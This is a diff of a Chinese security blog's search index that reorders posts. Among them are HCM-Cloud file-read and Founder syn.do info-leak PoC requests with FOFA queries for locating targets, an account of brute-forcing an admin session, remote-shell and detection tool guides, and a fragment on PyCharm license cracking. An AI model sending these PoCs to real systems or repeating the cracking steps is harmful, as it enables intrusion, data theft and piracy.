@@ -1,23 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HCM-Cloud云端专业人力资源平台download任意文件读取漏洞</title>
-    <url>/2024/10/31/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍">#</a> 1、漏洞介绍</h1>
-<p>HCM-Cloud 云端专业人力资源平台 download 任意文件读取漏洞</p>
-<h2 id="fofa"><a class="markdownIt-Anchor" href="#fofa">#</a> fofa</h2>
-<p>icon_hash=“-859381597”</p>
-<h2 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> poc</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/model_report/file/download?index=/&amp;ext=/etc/passwd HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241031145132.png" alt="20241031145132"></p>
-<h2 id="漏洞来源"><a class="markdownIt-Anchor" href="#漏洞来源">#</a> 漏洞来源</h2>
-<p><a href="https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw">https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw</a></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pycharmd等永久激活</title>
     <url>/2024/11/10/Pycharmd%E7%AD%89%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
     <content><![CDATA[<h1 id="win版本支持20212-2024"><a class="markdownIt-Anchor" href="#win版本支持20212-2024">#</a> win 版本支持 2021.2-2024</h1>
@@ -52,76 +35,6 @@
 此方法激活少部分软件显示 2025 到期，实际永久不掉，放心使用<br>
 若显示 Key is invalid Help 激活无效 (如下图)，重启电脑在填入激活码<br>
 <img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232113.png" alt="20241110232113"></p>
-]]></content>
-      <tags>
-        <tag>神兵利器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RmEye-戎码之眼</title>
-    <url>/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</url>
-    <content><![CDATA[<h1 id="rmeye"><a class="markdownIt-Anchor" href="#rmeye">#</a> RmEye</h1>
-<p>RmEye 是一个 window 上的基于 att&amp;ck 现代 EDR 设计思想的威胁响应工具。不同于 EDR, 它轻量、高效。自身定位是轻量级威胁检出工具。而不是繁重的、需要付费的、效果不明的所谓的 EDR</p>
-<h2 id="功能特点"><a class="markdownIt-Anchor" href="#功能特点">#</a> 功能特点</h2>
-<ul>
-<li>基于 att&amp;ck 设计。所有设计只是为了符合 att&amp;ck 的攻击路径、攻击链 (虽然规则里面没有标注 T 因为懒惰)</li>
-<li>轻量、高效。为了不适用繁重超占内存的 ELK 设计思路，而且要保证检出的同时保证不会太重，agent 端使用了大量规则过滤，这样才使得后端使用 sqlite 作为数据库成为可能。单机日志平均一天 4M. 此外轻量级别的客户端一天只占 40-400KB 的内存.</li>
-<li>行为检出，让免杀成为过去式。基于 att&amp;ck 设计，只看行为不看文件。文件类免杀已经成为过去式.</li>
-<li>高扩展性。可随需求定制功能</li>
-</ul>
-<h2 id="rmeye-之所以不是-edrxdrmdrndrxxxxxdr"><a class="markdownIt-Anchor" href="#rmeye-之所以不是-edrxdrmdrndrxxxxxdr">#</a> RmEye 之所以不是 Edr/Xdr/Mdr/Ndr/XXXXXdr</h2>
-<ul>
-<li>RmEye 没有流量监控</li>
-<li>RmEye 仅覆盖 20% 左右的 datasource</li>
-<li>RmEye 没有联动 WAF、IPS/IDS</li>
-<li>RmEye 没有实时拦截功能</li>
-<li>对 RPC、COM、ALPC 基本无能为力</li>
-<li>不支持更高级的扩展检测，如检测脚本、下发规则，主机链</li>
-<li>受限于 Sysmon, 很多 att&amp;ck 的 T 没有覆盖，也无法覆盖.</li>
-<li>没有响应能力，只能被动记录。请牢记，RmEye 自身定位是轻量级威胁检出工具</li>
-<li>github 链接：<a href="https://github.com/RoomaSec/RmEye">https://github.com/RoomaSec/RmEye</a></li>
-</ul>
-<h2 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h2>
-<ul>
-<li>运行客户端<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194255.png" alt="20241105194255"><br>
- 下载 release ( <a href="https://github.com/RoomaSec/RmEye/releases">https://github.com/RoomaSec/RmEye/releases</a> ), 里面有客户端，服务端自行 clone 本项目<br>
-服务端是 python3 编写，安装完依赖库后输入</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python webserver.py</span><br></pre></td></tr></table></figure>
-<p>即可部署<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194408.png" alt="20241105194408"><br>
- 服务端部署后，修改 config.py 里面的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检出阈值,越高越难检出但是也会越准确  </span><br><span class="line">MAX_THREAT_SCORE = 170</span><br><span class="line"></span><br><span class="line"># 授权访问主站的IP列表.如果不在后台里面则不能访问后台  </span><br><span class="line">ALLOW_ACCESS_IP = [&#x27;127.0.0.1&#x27;]</span><br></pre></td></tr></table></figure>
-<p>MAX_THREAT_SCORE 代表报警分数，意思为进程链总分超过此分数则报警，越高越准但是也会漏报 ALLOW_ACCESS_IP 代表允许的 IP, 只有在此名单里面的 IP 才能访问后台。请增加自己的 IP 地址<br>
-客户端则编辑 config.ini</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[communication]</span><br><span class="line">server = http://192.168.111.189:5000</span><br></pre></td></tr></table></figure>
-<p>其中 server 改成你的服务端的地址<br>
-然后分发三个文件给客户端并且放在同一目录:<br>
-config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
- 之后管理员身份运行 install.cmd 安装 sysmon 与 RmEye<br>
- 访问 <a href="http://xn--ip-fr5c86lx7z:5000">http:// 服务器 ip:5000</a> (flask 默认端口) 查看后台<br>
-当然一开始啥数据也没有，为了确认是否安装成功可以将 webserver.py 中的</p>
-<h2 id="检出截图"><a class="markdownIt-Anchor" href="#检出截图">#</a> 检出截图</h2>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194549.png" alt="20241105194549"><br>
- 威胁列表<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194613.png" alt="20241105194613"><br>
- 详细进程<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194641.png" alt="20241105194641"></p>
-<h2 id="卸载"><a class="markdownIt-Anchor" href="#卸载">#</a> 卸载</h2>
-<p>卸载 RmEye: 在 RmEye 目录下执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SysEye /uninstall</span><br></pre></td></tr></table></figure>
-<p>如果您需要卸载 sysmon 执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon /uninstall</span><br></pre></td></tr></table></figure>
-<p>即可干净卫生的卸载掉 RmEye</p>
-<h2 id="ioc"><a class="markdownIt-Anchor" href="#ioc">#</a> IOC</h2>
-<p>目前 RmEye 使用的是<a href="https://metadefender.opswat.com/%E7%9A%84%E5%85%8D%E8%B4%B9IOC,%E7%9B%AE%E5%89%8D%E7%9A%84apikey%E4%BB%85%E7%94%A8%E4%BA%8E%E6%B5%8B%E8%AF%95,%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E8%AF%B7%E5%8A%A1%E5%BF%85%E6%89%93%E5%BC%80plugins/ioc_opswat/opswat.py%E6%8A%8A%22apikey%22:"> https://metadefender.opswat.com/ 的免费 IOC, 目前的 apikey 仅用于测试，自己部署的时候请务必打开 plugins/ioc_opswat/opswat.py 把 &quot;apikey&quot;:</a> &quot;010d4868aef799750e2828fdf17a4d98&quot; 换成你自己的，否做会不安全 (比如其他人能查得到你的请求记录)/ 有使用量限制 (100 次一天). 所以务必换成你自己注册的账号。这个 IOC 源是免费的而且好用的，比 OTX 好用</p>
-<h2 id="第三方引用库"><a class="markdownIt-Anchor" href="#第三方引用库">#</a> 第三方引用库</h2>
-<p>1、sysmon <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon</a><br>
-2、rule_engine <a href="https://github.com/zeroSteiner/rule-engine">https://github.com/zeroSteiner/rule-engine</a><br>
-3、yara <a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a><br>
-4、sysmon-config (客户端使用的默认的规则，但是我做了一些修改) <a href="https://github.com/SwiftOnSecurity/sysmon-config">https://github.com/SwiftOnSecurity/sysmon-config</a><br>
- 请遵守相关库的开源协议。相关法律风险本项目不负任何责任</p>
 ]]></content>
       <tags>
         <tag>神兵利器</tag>
@@ -329,6 +242,93 @@ config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
       </tags>
   </entry>
   <entry>
+    <title>HCM-Cloud云端专业人力资源平台download任意文件读取漏洞</title>
+    <url>/2024/10/31/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍">#</a> 1、漏洞介绍</h1>
+<p>HCM-Cloud 云端专业人力资源平台 download 任意文件读取漏洞</p>
+<h2 id="fofa"><a class="markdownIt-Anchor" href="#fofa">#</a> fofa</h2>
+<p>icon_hash=“-859381597”</p>
+<h2 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> poc</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/model_report/file/download?index=/&amp;ext=/etc/passwd HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241031145132.png" alt="20241031145132"></p>
+<h2 id="漏洞来源"><a class="markdownIt-Anchor" href="#漏洞来源">#</a> 漏洞来源</h2>
+<p><a href="https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw">https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw</a></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RmEye-戎码之眼</title>
+    <url>/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</url>
+    <content><![CDATA[<h1 id="rmeye"><a class="markdownIt-Anchor" href="#rmeye">#</a> RmEye</h1>
+<p>RmEye 是一个 window 上的基于 att&amp;ck 现代 EDR 设计思想的威胁响应工具。不同于 EDR, 它轻量、高效。自身定位是轻量级威胁检出工具。而不是繁重的、需要付费的、效果不明的所谓的 EDR</p>
+<h2 id="功能特点"><a class="markdownIt-Anchor" href="#功能特点">#</a> 功能特点</h2>
+<ul>
+<li>基于 att&amp;ck 设计。所有设计只是为了符合 att&amp;ck 的攻击路径、攻击链 (虽然规则里面没有标注 T 因为懒惰)</li>
+<li>轻量、高效。为了不适用繁重超占内存的 ELK 设计思路，而且要保证检出的同时保证不会太重，agent 端使用了大量规则过滤，这样才使得后端使用 sqlite 作为数据库成为可能。单机日志平均一天 4M. 此外轻量级别的客户端一天只占 40-400KB 的内存.</li>
+<li>行为检出，让免杀成为过去式。基于 att&amp;ck 设计，只看行为不看文件。文件类免杀已经成为过去式.</li>
+<li>高扩展性。可随需求定制功能</li>
+</ul>
+<h2 id="rmeye-之所以不是-edrxdrmdrndrxxxxxdr"><a class="markdownIt-Anchor" href="#rmeye-之所以不是-edrxdrmdrndrxxxxxdr">#</a> RmEye 之所以不是 Edr/Xdr/Mdr/Ndr/XXXXXdr</h2>
+<ul>
+<li>RmEye 没有流量监控</li>
+<li>RmEye 仅覆盖 20% 左右的 datasource</li>
+<li>RmEye 没有联动 WAF、IPS/IDS</li>
+<li>RmEye 没有实时拦截功能</li>
+<li>对 RPC、COM、ALPC 基本无能为力</li>
+<li>不支持更高级的扩展检测，如检测脚本、下发规则，主机链</li>
+<li>受限于 Sysmon, 很多 att&amp;ck 的 T 没有覆盖，也无法覆盖.</li>
+<li>没有响应能力，只能被动记录。请牢记，RmEye 自身定位是轻量级威胁检出工具</li>
+<li>github 链接：<a href="https://github.com/RoomaSec/RmEye">https://github.com/RoomaSec/RmEye</a></li>
+</ul>
+<h2 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h2>
+<ul>
+<li>运行客户端<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194255.png" alt="20241105194255"><br>
+ 下载 release ( <a href="https://github.com/RoomaSec/RmEye/releases">https://github.com/RoomaSec/RmEye/releases</a> ), 里面有客户端，服务端自行 clone 本项目<br>
+服务端是 python3 编写，安装完依赖库后输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python webserver.py</span><br></pre></td></tr></table></figure>
+<p>即可部署<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194408.png" alt="20241105194408"><br>
+ 服务端部署后，修改 config.py 里面的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检出阈值,越高越难检出但是也会越准确  </span><br><span class="line">MAX_THREAT_SCORE = 170</span><br><span class="line"></span><br><span class="line"># 授权访问主站的IP列表.如果不在后台里面则不能访问后台  </span><br><span class="line">ALLOW_ACCESS_IP = [&#x27;127.0.0.1&#x27;]</span><br></pre></td></tr></table></figure>
+<p>MAX_THREAT_SCORE 代表报警分数，意思为进程链总分超过此分数则报警，越高越准但是也会漏报 ALLOW_ACCESS_IP 代表允许的 IP, 只有在此名单里面的 IP 才能访问后台。请增加自己的 IP 地址<br>
+客户端则编辑 config.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[communication]</span><br><span class="line">server = http://192.168.111.189:5000</span><br></pre></td></tr></table></figure>
+<p>其中 server 改成你的服务端的地址<br>
+然后分发三个文件给客户端并且放在同一目录:<br>
+config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
+ 之后管理员身份运行 install.cmd 安装 sysmon 与 RmEye<br>
+ 访问 <a href="http://xn--ip-fr5c86lx7z:5000">http:// 服务器 ip:5000</a> (flask 默认端口) 查看后台<br>
+当然一开始啥数据也没有，为了确认是否安装成功可以将 webserver.py 中的</p>
+<h2 id="检出截图"><a class="markdownIt-Anchor" href="#检出截图">#</a> 检出截图</h2>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194549.png" alt="20241105194549"><br>
+ 威胁列表<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194613.png" alt="20241105194613"><br>
+ 详细进程<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194641.png" alt="20241105194641"></p>
+<h2 id="卸载"><a class="markdownIt-Anchor" href="#卸载">#</a> 卸载</h2>
+<p>卸载 RmEye: 在 RmEye 目录下执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SysEye /uninstall</span><br></pre></td></tr></table></figure>
+<p>如果您需要卸载 sysmon 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon /uninstall</span><br></pre></td></tr></table></figure>
+<p>即可干净卫生的卸载掉 RmEye</p>
+<h2 id="ioc"><a class="markdownIt-Anchor" href="#ioc">#</a> IOC</h2>
+<p>目前 RmEye 使用的是<a href="https://metadefender.opswat.com/%E7%9A%84%E5%85%8D%E8%B4%B9IOC,%E7%9B%AE%E5%89%8D%E7%9A%84apikey%E4%BB%85%E7%94%A8%E4%BA%8E%E6%B5%8B%E8%AF%95,%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E8%AF%B7%E5%8A%A1%E5%BF%85%E6%89%93%E5%BC%80plugins/ioc_opswat/opswat.py%E6%8A%8A%22apikey%22:"> https://metadefender.opswat.com/ 的免费 IOC, 目前的 apikey 仅用于测试，自己部署的时候请务必打开 plugins/ioc_opswat/opswat.py 把 &quot;apikey&quot;:</a> &quot;010d4868aef799750e2828fdf17a4d98&quot; 换成你自己的，否做会不安全 (比如其他人能查得到你的请求记录)/ 有使用量限制 (100 次一天). 所以务必换成你自己注册的账号。这个 IOC 源是免费的而且好用的，比 OTX 好用</p>
+<h2 id="第三方引用库"><a class="markdownIt-Anchor" href="#第三方引用库">#</a> 第三方引用库</h2>
+<p>1、sysmon <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon</a><br>
+2、rule_engine <a href="https://github.com/zeroSteiner/rule-engine">https://github.com/zeroSteiner/rule-engine</a><br>
+3、yara <a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a><br>
+4、sysmon-config (客户端使用的默认的规则，但是我做了一些修改) <a href="https://github.com/SwiftOnSecurity/sysmon-config">https://github.com/SwiftOnSecurity/sysmon-config</a><br>
+ 请遵守相关库的开源协议。相关法律风险本项目不负任何责任</p>
+]]></content>
+      <tags>
+        <tag>神兵利器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>huggingface/transformers RCE</title>
     <url>/2024/10/28/huggingfaceRCE/</url>
     <content><![CDATA[<h1 id="huggingfacetransformers-rce漏洞分析-cve-2024-3568"><a class="markdownIt-Anchor" href="#huggingfacetransformers-rce漏洞分析-cve-2024-3568">#</a> huggingface/	transformers RCE 漏洞分析 （CVE-2024-3568）</h1>
@@ -377,6 +377,51 @@ config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe<br>
 ]]></content>
       <tags>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>natpass 主机管理工具</title>
+    <url>/2024/11/12/natpass/</url>
+    <content><![CDATA[<h1 id="主机管理工具-natpass"><a class="markdownIt-Anchor" href="#主机管理工具-natpass">#</a> 主机管理工具 - Natpass</h1>
+<pre><code>如果你有多台电脑该如何统一管理呢？natpass可以轻松解决以上问题。它是一款新一代主机管理工具，支持shell管理，支持远程桌面管理，支持多种操作系统和web平台。当然，也可以利用此工具进行渗透测试。
+</code></pre>
+<h2 id="部署"><a class="markdownIt-Anchor" href="#部署">#</a> 部署</h2>
+<p>部署过程共分为三部分：服务器端、受控端和控制端三部分组成。当然，服务端和控制端可以为同一台设备。首先，我们到中根据系统下载包。<br>
+项目地址：<a href="https://github.com/lwch/natpass/releases">https://github.com/lwch/natpass/releases</a></p>
+<ul>
+<li>解压</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf natpass_0.13.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>
+<h2 id="部署服务端"><a class="markdownIt-Anchor" href="#部署服务端">#</a> 部署服务端</h2>
+<p>进入软件目录，执行下面命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./np-svr --conf server.yaml</span><br></pre></td></tr></table></figure>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112101939.png" alt="20241112101939"></p>
+<h2 id="部署控制端"><a class="markdownIt-Anchor" href="#部署控制端">#</a> 部署控制端</h2>
+<pre><code>./np-cli --conf local.yaml
+</code></pre>
+<p>具体的配置在 local.yaml 文件中，如端口等。<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104251.png" alt="20241112104251"></p>
+<h2 id="访问"><a class="markdownIt-Anchor" href="#访问">#</a> 访问</h2>
+<p>在以上操作成功后即可在浏览器中通过 local.yaml 中配置的端口号进行访问，默认地址：<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a><br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104329.png" alt="20241112104329"></p>
+<h2 id="受控端"><a class="markdownIt-Anchor" href="#受控端">#</a> 受控端</h2>
+<p>受控端，我以 Windows11 为例。首先现在 Windows 平台的安装包。修改 remote.yaml 中的 server 地址。<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104426.png" alt="20241112104426"><br>
+ 使用以下命令启动客户端程序<br>
+ np-cli.exe --conf remote.yaml<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104503.png" alt="20241112104503"><br>
+ 至此，所有配置均已完成。</p>
+<h2 id="使用"><a class="markdownIt-Anchor" href="#使用">#</a> 使用</h2>
+<p>点击 shell 连接<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104541.png" alt="20241112104541"><br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104650.png" alt="20241112104650"></p>
+<h2 id="vnc连接"><a class="markdownIt-Anchor" href="#vnc连接">#</a> Vnc 连接</h2>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104738.png" alt="20241112104738"></p>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h2>
+<p>利用 natpass 我们能很便捷的完成不同平台多台电脑直接的统一管理。使用很便捷，小伙伴们有需要的，可以收藏哦！但部分功能尚未完善，如文件管理。期待作者的更新！</p>
+]]></content>
+      <tags>
+        <tag>神兵利器</tag>
       </tags>
   </entry>
   <entry>
@@ -442,68 +487,6 @@ SHA256：ef18c975d970f42e959560ff9718d258316bce8e5295034f987cc40eddf95432</li>
 ]]></content>
       <tags>
         <tag>应急响应</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>natpass 主机管理工具</title>
-    <url>/2024/11/12/natpass/</url>
-    <content><![CDATA[<h1 id="主机管理工具-natpass"><a class="markdownIt-Anchor" href="#主机管理工具-natpass">#</a> 主机管理工具 - Natpass</h1>
-<pre><code>如果你有多台电脑该如何统一管理呢？natpass可以轻松解决以上问题。它是一款新一代主机管理工具，支持shell管理，支持远程桌面管理，支持多种操作系统和web平台。当然，也可以利用此工具进行渗透测试。
-</code></pre>
-<h2 id="部署"><a class="markdownIt-Anchor" href="#部署">#</a> 部署</h2>
-<p>部署过程共分为三部分：服务器端、受控端和控制端三部分组成。当然，服务端和控制端可以为同一台设备。首先，我们到中根据系统下载包。<br>
-项目地址：<a href="https://github.com/lwch/natpass/releases">https://github.com/lwch/natpass/releases</a></p>
-<ul>
-<li>解压</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf natpass_0.13.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>
-<h2 id="部署服务端"><a class="markdownIt-Anchor" href="#部署服务端">#</a> 部署服务端</h2>
-<p>进入软件目录，执行下面命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./np-svr --conf server.yaml</span><br></pre></td></tr></table></figure>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112101939.png" alt="20241112101939"></p>
-<h2 id="部署控制端"><a class="markdownIt-Anchor" href="#部署控制端">#</a> 部署控制端</h2>
-<pre><code>./np-cli --conf local.yaml
-</code></pre>
-<p>具体的配置在 local.yaml 文件中，如端口等。<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104251.png" alt="20241112104251"></p>
-<h2 id="访问"><a class="markdownIt-Anchor" href="#访问">#</a> 访问</h2>
-<p>在以上操作成功后即可在浏览器中通过 local.yaml 中配置的端口号进行访问，默认地址：<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a><br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104329.png" alt="20241112104329"></p>
-<h2 id="受控端"><a class="markdownIt-Anchor" href="#受控端">#</a> 受控端</h2>
-<p>受控端，我以 Windows11 为例。首先现在 Windows 平台的安装包。修改 remote.yaml 中的 server 地址。<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104426.png" alt="20241112104426"><br>
- 使用以下命令启动客户端程序<br>
- np-cli.exe --conf remote.yaml<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104503.png" alt="20241112104503"><br>
- 至此，所有配置均已完成。</p>
-<h2 id="使用"><a class="markdownIt-Anchor" href="#使用">#</a> 使用</h2>
-<p>点击 shell 连接<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104541.png" alt="20241112104541"><br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104650.png" alt="20241112104650"></p>
-<h2 id="vnc连接"><a class="markdownIt-Anchor" href="#vnc连接">#</a> Vnc 连接</h2>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104738.png" alt="20241112104738"></p>
-<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h2>
-<p>利用 natpass 我们能很便捷的完成不同平台多台电脑直接的统一管理。使用很便捷，小伙伴们有需要的，可以收藏哦！但部分功能尚未完善，如文件管理。期待作者的更新！</p>
-]]></content>
-      <tags>
-        <tag>神兵利器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
-    <url>/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="方正全媒体采编系统存在syndo信息泄露漏洞"><a class="markdownIt-Anchor" href="#方正全媒体采编系统存在syndo信息泄露漏洞">#</a> 方正全媒体采编系统存在 syn.do 信息泄露漏洞</h1>
-<h2 id="1-漏洞介绍"><a class="markdownIt-Anchor" href="#1-漏洞介绍">#</a> 1、漏洞介绍</h2>
-<p>​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。</p>
-<h2 id="2-fofa语句"><a class="markdownIt-Anchor" href="#2-fofa语句">#</a> 2、 fofa 语句</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;FOUNDER-全媒体采编系统&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="3-poc"><a class="markdownIt-Anchor" href="#3-poc">#</a> 3、POC</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /newsedit/assess/syn.do?type=org HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Content-Length: 185Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<h2 id="4-验证"><a class="markdownIt-Anchor" href="#4-验证">#</a> 4、验证</h2>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png" alt="image.png"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -618,6 +601,23 @@ docker-compose up -d<br>
  在爆破 url 的时候，发现好几处管理员的页面，提示用户权限不足，看了一下是用户管理，这里我们就可以再对当前页面继续进行 session 爆破，我这里运气比较好，成功爆破到了管理员的 session，一般情况来说生产环境的应用系统，管理员一般都是会登录的。<br>
 利用管理员的 session 成功登录到了人员管理界面<br>
 <img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/cb346346692012a13c10a9c66b30791e.png" alt="cb346346692012a13c10a9c66b30791e"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
+    <url>/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="方正全媒体采编系统存在syndo信息泄露漏洞"><a class="markdownIt-Anchor" href="#方正全媒体采编系统存在syndo信息泄露漏洞">#</a> 方正全媒体采编系统存在 syn.do 信息泄露漏洞</h1>
